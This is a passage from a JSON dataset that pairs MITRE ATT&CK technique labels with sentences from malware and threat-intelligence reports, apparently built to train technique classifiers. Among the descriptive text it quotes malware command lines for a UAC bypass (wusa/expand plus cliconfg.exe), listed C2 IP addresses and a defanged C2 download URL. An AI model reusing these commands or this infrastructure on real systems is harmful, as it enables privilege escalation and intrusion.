    "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components",
    "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim",
    "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection",
    "A multilayered approach is a must to securing the organization\u2019s perimeter, especially for information security professionals and system/IT administrators",
    "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label \u201cC:\\\u201d and the computer name",
    "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers",
    "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums",
    "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources",
    "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v",
    "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions",
    "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities",
    "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an \u201cagent_id\u201d, which is a unique identifier for each compromised host",
    "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the \u201cHardware UUID\u201d listed in the system information application, as seen in the Figure 3 screenshot of our analysis system",
    "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was \u201c0000\u201d",
    "The payload sends system information about the infected computer to the C&C server and downloads additional tools.",
    "If it is successful then it will send out basic host information and await further commands.",
    "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.",
    "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address",
    "",
    "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.",
    "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)"
  ],
  "system information discovery system network configuration discovery-multi": {
    "technique_names": [
      "system information discovery",
      "system network configuration discovery"
    ],
    "sentances": [
      "This has led it to do more, such as:  Communication with more C&C servers \u2013 up to 16 P2P communication between infected nodes MAC address check - PlugX runs if the MAC address of an infected host\u00a0coincides with configuration information in itself (If not specified in the configuration, PlugX runs on any host)",
      "The started command will send the following information to the C&C:  device_model: the model identifier (e.g.: MacBookPro9,2) bot_version: version of Keydnap build_name: the \u201cbuild name\u201d that was given by downloader os_version: OS X or macOS kernel version ip_address: external IP address as reported by ipify.org has_root: 1 if executed as root, 0 otherwise  Backdoor commands The response to get_task contains an integer to identify the type of command and optional arguments",
      "AC,CNAME,MX,TXT,SRV,SOA Uses the regular expression \u2018Address:\\s+(\\d+.\\d+.\\d+.\\d+)\u2019 and uses the decimal value in the first octet of that IPv4 address    Table 1 Breakdown of query types Once the system identifier is obtained, the payload gathers system specific information and sends it to the C2 server"
    ]
  },
  "abuse elevation control mechanism: bypass user account control": [
    "(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced",
    "This request is followed by a call to \u201cGetisrunasAbById\u201d to determine if the Trojan should use \u201crunas\u201d to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click",
    "The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)",
    "The macro then extracts the CAB file into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows",
    "The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS",
    "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)"
  ],
  "system network configuration discovery fallback channels-multi": {
    "technique_names": [
      "system network configuration discovery",
      "fallback channels"
    ],
    "sentances": [
      "When one PlugX succeeds to infect a host, it then accesses to every IP address in the local network one-by-one and communicate with any connectable nodes, using one of the following protocols listed in Table 2",
      "We include a list of observed\u00a0hardcoded ip C2 addresses here, along with the address owner and geophysical location of the host:    C2 IP address Owner Country   184.22.205.194 hostnoc.net US   5.79.80.166 Leaseweb NL   46.165.222.28 Leaseweb NL   95.211.122.36 Leaseweb NL   46.165.222.101 Leaseweb NL   46.165.222.6 Leaseweb NL   89.149.223.205 Leaseweb NL   85.17.94.134 Leaseweb NL   46.4.28.218 Hetzner DE   78.46.40.239 Hetzner DE   95.143.193.182 Serverconnect SE   188.227.176.74 Redstation GB   93.170.127.100 Nadym RU   37.220.34.56 Yisp NL   194.28.172.58 Besthosting.ua UA   124.217.253.10 PIRADIUS MY   84.19.161.123 Keyweb DE   109.236.88.12 worldstream.nl NL   212.124.110.62 digitalone.com US   5.61.38.31 3nt.com DE   5.255.87.39 serverius.com NL    It\u2019s interesting that one of these servers is a Tor exit node"
    ]
  },
  "system time discovery": [
    "Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself",
    "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph",
    "Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code",
    "These four were then all modified on the same date and time on October 13, 2018 08:21",
    "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time",
    "Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication",
    "This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017",
    "The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)",
    "The time of the observed attacker activity coincides with Iran\u2019s Daylight Time, which is +0430 UTC",
    "Cadelle and Chafer are most active during the day time within Iran\u2019s time zone and primarily operate during Iran\u2019s business week (Saturday through Thursday)",
    "When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode",
    "If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period",
    "This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode",
    "Timezone Check The Trojan check to see if the system is configured (\u201cDaylightName\u201d) with one of the following time zones: \u00a0 Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code: \u00a0 Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null); \u00a0 This dialog box displays \u00a0An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code",
    "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set",
    "Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog",
    "In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn\u2019t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application",
    "Watches uninstall time, checks time diff (local time vs internet time)",
    "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)"
  ],
  "deobfuscate/decode files or information": [
    "Here\u2019s a python code to decode",
    "The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT",
    "Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively",
    "This function is able to obfuscate code so that every iteration of the code is presented differently",
    "It then downloads and decrypts a PNG file",
    "The state command sets a global variable containing a series of Boolean values represented as ASCII values \u20180\u2019 or \u20181\u2019 and also adds itself to the configuration file",
    "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left",
    "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512",
    "Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502",
    "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on",
    "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA \u00a0 The resulting data is then parsed and decrypted using RC4",
    "Here is the code:The goal of this code is to get information from the properties of the document (\"Subject\", \"Company\", \"Category\", \"Hyperlink base\" and finally \"Comments\")",
    "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck",
    "This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence",
    "The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime",
    "Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code",
    "Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory",
    "If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above",
    "The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory",
    "The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\\setup.cab   Encoded CAB file in the Word document",
    "Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration",
    "The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function",
    "The most interesting part is the decrypted C&C configuration, as can be seen in the image below",
    "Figure 2 \u2013 The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker",
    "It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks",
    "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",
    "Packet::getData decrypts the received payload and Converter::outString descrambles the result",
    "In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  It proceeds to load and decrypt and embedded bitmap resource file",
    "In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine",
    "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine",
    "ESET\u2019s analysis of a recent backdoor used by TeleBots \u2013 the group behind the massive NotPetya ransomware outbreak \u2013 uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity",
    "The following code snippet was used to decode strings within OopsIE:out = \"\" for e in obfuscated_string.split(\"-\"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section",
    "This exception invokes the exception handler containing the HTTP communication code, allowing it to run",
    "Figure 1 \u2013 The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread",
    "The first shellcode decrypts a further shellcode block",
    "After decrypting the strings, they must be further decompressed using LZNT1",
    "It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B \u2013 Python Scripts",
    "To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers",
    "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document",
    "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute",
    "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string",
    "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one",
    "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data",
    "The unique strings mainly consist of \u201cMobile/BADDAD\u201c, \u201cMobile/7B405\u201d and \u201cE9BC3BD76216AFA560BFB5ACAF5731A3\u201d",
    "\u201cKnock\u201d also appears in several strings inside the code of SpeakUp",
    "Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool\u00a0  com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration",
    "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn\u2019t exposed until runtime",
    "No pdb/debug strings are present in the code",
    "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents",
    "In this particular instance, the payload is encoded via base64, which certutil decodes",
    "The following function written in Python may be used to decode this file:def decode(data): \tout = \"\" \tc = 0 \tfor d in data: \t\tout += chr(ord(d)^c) \t\tc+=1 \treturn outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117",
    "The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called: \u00a0int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, \"Invoke\", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task",
    "(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations",
    "The decrypted contents of the log file adhere to the format in Figure 22",
    "Decrypted OwaAuth log file format",
    "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers",
    "Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)",
    "The image and table below illustrate TClient\u2019s encrypted configuration that we decrypted (via Python code):  Figure 10",
    "Snapshot of code we used to decrypt TClient\u2019s configuration   Figure 11",
    "Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information",
    "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)"
  ],
  "disabling security tools standard application layer protocol system network configuration discovery-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "application layer protocol",
      "system network configuration discovery"
    ],
    "sentances": [
      "- Shusei Tomonaga (For any inquiry or incident report regarding PlugX, please contact info[at]jpcert.or.jp)  Appendix A: Entire Configuration of P2P PlugX Table 3: Entire Configuration of P2P PlugX   Offset Length Description   0x0000 20 Not used   0x0014 4 Flag if remove own DLL from list of modules   0x0018 4 Flag enable/disable key logger   0x001c 12 Not used   0x0028 4 Duration of suspend activity   0x002c 4 Duration of suspend activity   0x0030 672 Network Access Flag (for a week with 15min interval)   0x02d0 4 * 4 DNS Server IP Address x 4   0x02e0 68 * 16 control Server Information x 16   0x0720 128 * 16 HTTP Access URL x 16   0x0f20 196 * 4 Proxy/authentication config x 4   0x1230 4 Method to make it resident (e.g"
    ]
  },
  "create or modify system process": [
    "Create Service",
    "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques",
    "In addition, web traffic between a service provider\u2019s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily",
    "This effectively routes SOGU malware traffic through the victim\u2019s service provider, which likely indicates a foothold on the service provider\u2019s network",
    "These parameters install it as a service",
    "The malware operates on victims\u2019 systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks",
    "The malicious DLL is not a service DLL because it lacks ServiceMain()",
    "The victims Data from Cadelle\u2019s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services",
    "\"Are you Happy?\" campaign.\"FreeMilk\" campaign.\"North Korean Human Rights\" campaign.\"Evil New Year 2018\" campaign.On January 2nd of 2018, the \"Evil New Year 2018\" was started",
    "The document brought Talos a new gift - a new version of ROKRAT",
    "Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target",
    "BootComplete\u00a0starts the\u00a0AutoStartup\u00a0service and the\u00a0AutoStartup\u00a0service makes sure that\u00a0MainActivity\u00a0is always\u00a0running",
    "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  "
  ],
  "disabling security tools registry run keys / startup folder bypass user account control-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "boot or logon autostart execution: registry run keys / startup folder",
      "abuse elevation control mechanism: bypass user account control"
    ],
    "sentances": [
      "Create Run Key)   0x1234 512 Folder to Install   0x1434 512 Service Name   0x1634 512 Service Display Name   0x1834 512 Service Description   0x1a34 4 Registry Root Key Value for Run Registry Key Configuration   0x1a38 512 Run Registry Key Name   0x1c38 512 Run Registry Key Value   0x1e38 4 Enable/Disable Code injection   0x1e3c 512 * 4 Program Name for Code Injection x 4   0x263c 4 Enable/Disable Code injection for UAC Bypass   0x2640 512 * 4 Program Name to inject code for UAC Bypass x 4   0x2e40 512 Authentication Character String for PlugX   0x3040 512 Authentication Character String for C&C Server   0x3240 512 Mutex Name   0x3440 4 Enable/Disable Screen Capture   0x3444 4 * 5 Screen Capture Configuration Value   0x3458 528 Folder to Store Screen Captures   0x3658 4 Enable/Disable P2P(TCP)   0x365c 4 P2P(TCP) Port Number   0x3660 4 Enable/Disable P2P(UDP)   0x3664 4 P2P(UDP) Port Number   0x3668 4 Enable/Disable P2P(ICMP)   0x366c 4 P2P(ICMP) Port Number   0x3670 4 Enable/Disable P2P(IP Protocol Number 255)   0x3674 4 P2P(IP Protocol Number 255) Port Number   0x3678 4 Enable/Disable P2P Scanning   0x367c 4 * 4 P2P Scanning Beginning Address x 4   0x368c 4 * 4 P2P Scanning End Address x 4   0x369c 6 Run program if this MAC Address is used   0x36a2 2 Not used    Appendix B: \u00a0SHA-256 hash value of P2P PlugX  bc65e2859f243ff45b12cd184bfed7b809f74e67e5bb61bc92ed94058d3d2515 93c85a8dd0becc4e396eea2dc15c0010ff58d2b873d44fd7e45711a27cfe613b 0ff134057a8b2e31b148fedfdd185f5b1a512149499a8c5c0915cf10b10a613e         \u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)  Since December 2012, he has been engaged in malware analysis and forensics investigation, and is especially involved in analyzing incidents of targeted attacks"
    ]
  },
  "ingress tool transfer": [
    "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules",
    "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file",
    "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.\u00a0  The file\u2019s path",
    "The directory creation.\u00a0 Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files",
    "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.\u00a0  The script verifies all parts of the malware have been downloaded.\u00a0 After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.\u00a0  One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.\u00a0  The twelve downloaded files",
    "The config file provides download instructions for the loader",
    "Displayed below are these new, xml formatted plugin names \u201cweap_hwi\u201d, \u201cps\u201d, and \u201cvsnet\u201d in a BlackEnergy configuration file download from a c2 server",
    "One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered\u00a0installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy",
    "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically \u201cCommand\u201d, \u201cExplorer\u201d, \u201cUpload\u201d, \u201cDownload\u201d, \u201cSql Server\u201d and \u201cChange Time\u201d",
    "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems",
    "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server",
    "Symantec determined a more accurate picture of Buckeye\u2019s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers",
    "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself",
    "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files",
    "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware",
    "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account",
    "Upon execution, the initialized file downloads multiple malicious payloads from remote servers",
    "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session",
    "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded",
